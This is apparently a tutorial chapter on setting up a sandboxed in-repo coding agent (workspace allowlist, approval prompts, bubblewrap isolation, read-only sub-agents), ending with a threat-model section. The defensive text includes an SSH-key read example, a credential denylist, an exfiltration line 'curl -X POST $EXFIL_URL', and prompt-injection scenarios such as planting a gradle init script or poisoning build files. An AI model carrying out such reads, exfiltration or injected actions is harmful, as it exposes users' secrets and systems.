# Chapter 3 — The in-repo coding agent

This is the dense chapter. `pikuri-code` is an in-repo coding
agent in the spirit of Claude Code / opencode / pi-code, and
wiring it up reapplies the Extension pattern from chapter 2 across
**three new seams at once** — `Workspace` (what the LLM sees on
the filesystem), `Confirmer` (how user-state mutations get
approved), and `Sandbox` (what filesystem the `bash` subprocess
actually runs against). On top of that, it brings in
[Agent Skills](https://agentskills.io/specification) discovery and
uses `SCOUT` (the read-only counterpart to `RESEARCHER` from
chapter 2) for code recon.

The chapter ends with an honest threat-model section. **Read it
before you point `pikuri-code` at anything sensitive.**

## Prerequisites

Chapters [1](01-chat.md) and [2](02-subagents.md). `llama-server`
running. `bundle install` done. Plus a couple of OS-level pieces:

- **`bubblewrap`** (`bwrap`) — the filesystem sandbox the `bash`
  tool uses by default. On Debian / Ubuntu:
  `sudo apt install bubblewrap`. `pikuri-code` fails loudly at
  boot if `bwrap` is missing rather than silently running without
  it; if you want to skip the sandbox, pass `--no-sandbox`
  explicitly.
- A throwaway directory to point it at. Don't run it against
  anything you mind losing.

## 1. Run it

```sh
mkdir /tmp/pikuri-playground && cd /tmp/pikuri-playground
/path/to/pikuri/pikuri-code/bin/pikuri-code
```

You'll land in a REPL with a `>` prompt — same shape as
`pikuri-chat`, except the agent now has `read`, `grep`, `glob`,
`edit`, `write`, `bash`, the four web/calculator tools from
chapter 1, the `skill` tool, and the `agent` tool (with both
`SCOUT` and `RESEARCHER` personas wired in). Try:

```
> Write a small Ruby script hello.rb that prints "hi, $USER" and run it.
```

What you should see:

1. The agent calls `write` to create `hello.rb`. Because `write`
   is a user-state mutation, the terminal prompts you `(y/n)?` —
   read the proposed content, type `y` to approve.
2. The agent calls `bash` with `ruby hello.rb`. The `bash` tool
   also prompts for approval — again, `y`.
3. The script runs *inside the bubblewrap sandbox* (you can tell
   because if you ask it to `cat ~/.ssh/id_ed25519`, it'll get
   "No such file or directory" — `~/.ssh` is not in the
   workspace's readable list, so it isn't mounted into the
   sandbox).
4. The agent reports the result.

That's the whole loop. The rest of this chapter is what those
prompts and isolations are actually doing.

## The Workspace seam — what the LLM sees

`Pikuri::Workspace::Filesystem` is the object every filesystem
tool (`read`, `write`, `edit`, `grep`, `glob`) takes via its
constructor. Every path the LLM hands to those tools is routed
through `workspace.resolve_for_read(path)` or
`workspace.resolve_for_write(path)` before the tool touches disk.
Out-of-bounds paths (`..`-escapes, symlinks that resolve outside,
absolute paths in a directory the workspace doesn't cover) are
rejected with an LLM-readable `Error:` string.

`pikuri-code` constructs the workspace at startup like this
(simplified):

```ruby
workspace = Pikuri::Workspace::Filesystem.new(
  project_root: project_root,                  # writable; the anchor
  readable:     Pikuri::Code::ToolchainPaths.readable +
                toolchain_overlay +
                skill_catalog.roots,
  temp:         true                           # ephemeral playground
)
```

The four kwargs:

- **`project_root`** — the workspace's anchor. Writable and
  readable unconditionally, the base for resolving relative paths,
  and the chdir target for `bash` / `grep` / `glob`. There is
  deliberately no separate "cwd" concept: hosts that want the
  agent scoped to a subtree pass that subtree as `project_root`.
  `bin/pikuri-code` actually `Dir.chdir`s the Ruby process to the
  discovered project root at startup so the process cwd and the
  workspace agree on one anchor.
- **`readable`** — extra read-only roots. `pikuri-code` includes
  system toolchains (`/usr`, `/opt`), per-user dependency caches
  (`~/.gradle`, `~/.m2/repository`, `~/.cargo/registry`, …), and
  the skill catalog roots, so the LLM can `grep` the Ruby stdlib
  or read JDK sources without those paths becoming writable.
- **`writable`** — extra writable roots. Empty by default for
  `pikuri-code`; the project root is already writable.
- **`temp: true`** — mints an ephemeral playground subdir under
  `~/.cache/pikuri/workspace-XXX/`, exposed to the LLM via the
  system prompt as scratch space (downloads, unpacks, junk
  artifacts). Removed at process exit by a single `at_exit`
  handler.

A second concrete class, `Pikuri::Workspace::Filesystem::AllowAll`,
lifts the read/write restrictions and accepts any path *except*
those on a hardcoded credential denylist (`~/.ssh`, `~/.aws`,
`~/.gnupg`, `~/.kube`, `~/.docker`, `/etc/shadow`, …). It's what
`--yolo` swaps in for use inside a container, where the container
itself is the security boundary and the workspace allowlist is
moot. **Don't combine `AllowAll` with bubblewrap** — `--yolo` also
disables the sandbox, and re-enabling bubblewrap on top would
defeat both layers.

## The Confirmer seam — how mutations get approved

`Pikuri::Workspace::Confirmer` is the *only* path through which
the `write` and `bash` tools reach the user for approval. Tools
never call `gets` / `puts` / `$stdin` directly; they call
`confirmer.confirm?(prompt: "...")`. Two bundled implementations:

- **`Pikuri::Workspace::Confirmer::TERMINAL`** — prompts on
  stdin/stdout, returns `true` on `y`/`Y`/empty (accepted as
  enter-to-confirm). The default for `pikuri-code` and what you
  saw at the `(y/n)?` prompt.
- **`Pikuri::Workspace::Confirmer::AUTO_APPROVE`** —
  yes-to-everything. Used by `--no-confirm` and `--yolo`, and by
  specs.

The seam exists so a future TUI / IDE / `pikuri-tui` host plugs
in by writing a new `Confirmer` subclass — not by editing tool
internals.

## The Sandbox seam — what the bash subprocess sees

This is the seam that's *distinct from* Workspace and worth taking
slowly. The split:

- **Workspace** decides what the LLM can observe via
  `read` / `write` / `edit` / `grep` / `glob`.
- **Sandbox** decides what filesystem view the `bash` subprocess
  runs against when it `cat`s a file or `curl`s a URL.

They overlap on the project + toolchain dirs (both should be
visible) but diverge on the OS-runtime baseline: the LLM has no
business `read`ing `/etc/resolv.conf`, but the `curl` subprocess
needs it for DNS. Keeping the two concerns in distinct objects
means each can stay focused.

`Pikuri::Code::Bash` takes a `Sandbox` via constructor and wraps
every spawned argv through `sandbox.wrap(argv)`. Two bundled
implementations:

- **`Sandbox::NONE`** — identity wrap. The default for
  `Pikuri::Code::Bash.new` (so specs and non-coding binaries get
  the simplest behaviour), and what `--no-sandbox` / `--yolo`
  swap in.
- **`Sandbox::Bubblewrap`** — wraps `argv` with `bwrap` + bind /
  isolation flags. What `pikuri-code` uses by default.

`Bubblewrap` composes its `bwrap` argv from three sources:

1. `workspace.readable` → each path bound read-only at the same
   path in the sandbox. `workspace.writable` → each path bound
   read-write.
2. A curated `/etc` baseline (`ETC_BASELINE`): `/etc/ssl`,
   `/etc/ca-certificates`, `/etc/resolv.conf`,
   `/etc/nsswitch.conf`, `/etc/localtime`, `/etc/hosts`. Allowlist,
   not the whole `/etc` — nothing sensitive (no `/etc/shadow`, no
   `~/.ssh_config`, no NetworkManager state).
3. **Per-toolchain ephemeral overlays** (`~/.gradle/caches`,
   `~/.m2/repository`, `~/.cargo/registry`, …): each mounted as a
   bubblewrap overlay where the host's real cache is the lower
   (read-through), and a per-session upper layer under
   `<workspace.internal_temp>/overlay-<slug>/` absorbs writes.
   Toolchains see a fully writable cache; the host's real cache
   stays clean; writes vanish at process exit.

The overlays exist because gradle/maven/cargo need to *write* to
their caches to function, but giving the agent persistent
read-write across sessions would mean a prompt-injected
`pikuri-code` session could plant `~/.gradle/init.d/payload.gradle`
and have it execute the next time the user ran `gradle` outside
the agent. The overlay lets the toolchain function within one
session and discards everything at session end.

The bundled overlays are content-only subdirs of each toolchain's
`$HOME`, deliberately *not* the toolchain's whole `$HOME`. That
way `~/.gradle/gradle.properties` (which may hold signing keys and
OSSRH tokens), `~/.gradle/init.d` (a persistence vector),
`~/.m2/settings.xml`, `~/.cargo/credentials.toml` — those never
appear in the sandbox at all.

## How the `pikuri-code` wiring looks all together

The block inside `Pikuri::Agent.new` in `bin/pikuri-code` is the
densest application of the Configurator+Extension pattern in the
codebase. Stripped of the surrounding boilerplate:

```ruby
agent = Pikuri::Agent.new(transport: ..., system_prompt: ...) do |c|
  c.add_listener Pikuri::Agent::Listener::Terminal.new
  c.add_listener Pikuri::Agent::Listener::TokenLog.new

  # File/shell stack
  c.add_tool Pikuri::Workspace::Read.new(workspace: workspace)
  c.add_tool Pikuri::Workspace::Grep.new(workspace: workspace)
  c.add_tool Pikuri::Workspace::Glob.new(workspace: workspace)
  c.add_tool Pikuri::Workspace::Edit.new(workspace: workspace)
  c.add_tool Pikuri::Workspace::Write.new(
    workspace: workspace, confirmer: confirmer
  )
  c.add_tool Pikuri::Code::Bash.new(
    workspace: workspace, confirmer: confirmer, sandbox: sandbox
  )

  # Auxiliary stateless tools (same instances as in pikuri-chat)
  c.add_tool Pikuri::Tool::WEB_SEARCH
  c.add_tool Pikuri::Tool::WEB_SCRAPE
  c.add_tool Pikuri::Tool::FETCH
  c.add_tool Pikuri::Tool::CALCULATOR

  # Three extensions — same configure/bind shape as ch.2
  c.add_extension Pikuri::Skill::Extension.new(catalog: skill_catalog)
  c.add_extension Pikuri::Mcp::Extension.new(registry: mcp_registry,
                                              synthesize_descriptions: true,
                                              verify_mcp_servers: true)
  c.add_extension Pikuri::SubAgent::Extension.new(
    personas: [Pikuri::SubAgent::SCOUT, Pikuri::SubAgent::RESEARCHER]
  )
end
```

Three observations on this block:

1. **The Extension pattern is now familiar.** You met
   `SubAgent::Extension` in chapter 2 with its `configure(c)` +
   `bind(agent)` pair. `Skill::Extension` and `Mcp::Extension`
   are exactly the same shape — each one's `configure` appends a
   `<available_skills>` / `<available_mcps>` snippet to the system
   prompt and registers a tool (`skill` and `mcp_connect`
   respectively); each one's `bind` is where the per-agent state
   gets wired. New seams, same dance.
2. **The same `workspace` / `confirmer` instances thread through
   four tools.** `Write` and `Bash` both take `confirmer`; all six
   file/shell tools take `workspace`. One construction, shared
   wiring — which is also why sub-agents inheriting parent tool
   *instances* (chapter 2) preserves all that wiring: a `SCOUT`
   spawned here uses the parent's `Read` tool, which already has
   the parent's `workspace` wired in.
3. **Order matters for the SubAgent extension specifically.** The
   `SubAgent::Extension`'s `configure` validates `SCOUT`'s
   `tool_names: %w[read grep glob]` against `c.tools` — those
   three tools were `add_tool`'d above, so the validation passes.
   If you moved `add_extension` above them, you'd get an
   `ArgumentError` at boot. This is by design (fail fast on the
   host-side bug).

## SCOUT — code recon as a sub-agent

`SCOUT` is to filesystem reconnaissance what `RESEARCHER` is to
web research: a privilege-separated minion the parent can delegate
to so the noisy intermediate `read`s and `grep`s don't pollute
the parent's context.

```ruby
Pikuri::SubAgent::SCOUT
# => Persona.new(
#      name:          'scout',
#      tool_names:    %w[read grep glob],
#      max_steps:     15,
#      system_prompt: Pikuri.prompt('persona-scout'),
#      ...)
```

Try it. After `> Write hello.rb...` is done, ask the agent
something that exercises code recon:

```
> Find every spec that mentions the Cancellable class and summarize what they cover.
```

You should see the parent agent reason about the question and emit
an `agent(name: "scout", task: "...")` tool call rather than
running `grep` itself. A `scout 0` minion spins up with only
`read` / `grep` / `glob`, does the lookup on a clean conversation,
and returns one paragraph with `path:line` references. The parent
absorbs that summary as a single observation.

**Why this matters:** the parent's context stays clean — no
twenty individual file contents accumulated from `read` calls.
And the privilege-separation story: a malicious file the scout
reads can't talk it into running `bash`, `write`, `fetch`,
`web_search`, or recursively spawning another `agent`, because
none of those tools are in `SCOUT`'s `tool_names`. The reply that
comes back to the parent is just text — data, not instructions.

Chapter 2's lesson about extension non-inheritance is what makes
this work. If the parent's tools were inherited automatically,
spawning a `SCOUT` from a coding agent with `bash` in scope would
hand `bash` to the child, and the privilege separation would be a
lie. Personas opt in explicitly, and `SCOUT` opts in to three
read-only tools and nothing else.

## Agent Skills

`pikuri-code` discovers
[Agent Skills](https://agentskills.io/specification) at startup,
under `.pikuri/skills`, `.claude/skills`, or `.agents/skills`
beneath the project root and the user's home directory. Each skill
is a directory with a `SKILL.md` (frontmatter + body) plus any
sidecar files; the skill's description gets advertised to the LLM
via the `<available_skills>` snippet in the system prompt, and
the `skill` tool loads the body into the conversation on demand.

If you have no skills installed, the section is silent at boot. To
try one, drop a directory under `~/.claude/skills/` with a
minimal `SKILL.md`:

```markdown
---
name: lol
description: Reply with "lol" to anything.
---

When the user asks anything, just reply "lol". Nothing else.
```

Restart `pikuri-code`. The boot banner now reports the skill, and
asking anything should trigger the model to call `skill` with
`name: "lol"`, load the body, and answer accordingly.

The shape comes from the [Agent Skills standard](https://agentskills.io/specification),
which Claude Code and `pi` also implement — so a skill folder you
write once is portable across all three. Same idea as MCP for
servers: a single content format that multiple harnesses pick up.

## Threat model — what `pikuri-code` actually protects against

`pikuri-code` is a working demo of the coding-agent shape; it is
**not** a hardened tool. The threat model has clear gaps, and you
should run it accordingly.

What the default configuration *does* protect:

- **Workspace allowlist** for the file tools. The LLM cannot
  `read` your `~/.ssh/`, cannot `edit` your `~/.aws/credentials`,
  cannot `glob` outside the project + the read-only toolchain
  paths. `..`-escapes and out-of-bounds symlinks are rejected.
- **Bubblewrap filesystem isolation** for the `bash` subprocess.
  A `bash`-issued `cat ~/.ssh/id_ed25519` returns "No such file
  or directory" because `~/.ssh` isn't bound into the sandbox.
  `~/.gradle/init.d` is invisible — only the content subdirs of
  the toolchain caches are exposed, via per-session overlays whose
  writes vanish at process exit.
- **Confirmer prompts** for every `write` and every `bash`. You
  see the proposed content / command before it runs.
- **Privilege-separated sub-agents.** A `SCOUT` reading a
  prompt-injected file has no `bash` / `write` / network tool to
  hijack — the persona's `tool_names` list rules them out
  structurally.

What it *doesn't* protect:

- **Network egress.** `bash` has `--share-net` so `git pull`,
  `curl`, and `mvn` work. A `curl -X POST $EXFIL_URL` on file
  contents already loaded into context is one approved command
  away. The web tools (`web_search` / `web_scrape` / `fetch`) are
  similarly happy to pull whatever the model asks. Confirmation
  prompts for `bash` are your only check — read what's actually
  about to run before you say yes.
- **In-project mutation.** The agent can `edit` or `write`
  anything under the project root. A prompt-injected agent can
  poison `Gemfile`, `package.json`, the test suite, or the
  project's own build files. The workspace allowlist prevents
  reaching *out* of the project, not *into* it.
- **`--yolo` mode is exactly what it says.** It disables the
  sandbox, auto-approves every confirmation, and swaps the
  workspace to `AllowAll` (denylist of credential paths only). It
  exists for use *inside* a Docker container, a dev container, or
  a VM where the outer boundary is the protection. Running
  `--yolo` on your laptop is equivalent to handing the model a
  shell with your user's permissions.
- **No audit log of approved actions.** Once you approve a `bash`
  command, it runs; the record beyond your scrollback is whatever
  the underlying tools persist (shell history, git reflog, etc.).
- **No protection against the indirect injection chain.** A
  malicious URL that `web_scrape` fetches becomes part of the
  conversation, and its content can prompt-inject the model into
  taking other actions. The confirmation prompts and persona
  separation reduce the blast radius but don't eliminate the
  vector.

In short: **assume the agent can do anything your user can do
through `bash` with network access**, and approve each prompt on
that basis. For adversarial isolation, run `pikuri-code` inside a
container or VM — the container is the outer boundary, bubblewrap
is the inner one. `IDEAS.md` tracks the longer-term sandboxing
work.

## What's next

The natural next chapter is MCP and the `pikuri-assistant` binary
— the demonstration that the same `add_extension` pattern you saw
three times in `pikuri-code` also wires in connections to external
services like Gmail, GitHub, Linear, or Notion. That chapter lands
when `pikuri-assistant` has enough substance to be worth a
walkthrough.

In the meantime, the [`pikuri-mcp`](../../pikuri-mcp/README.md) and
[`pikuri-assistant`](../../pikuri-assistant/README.md) READMEs
cover the API surface and how to hand-edit the registry in the
binary. The vocabulary you built up in chapters 1–3
(`Pikuri::Agent`, `Tool`, listeners, the Extension protocol,
configure/bind, sub-agent privilege separation) is the entire
vocabulary needed to read either of them.
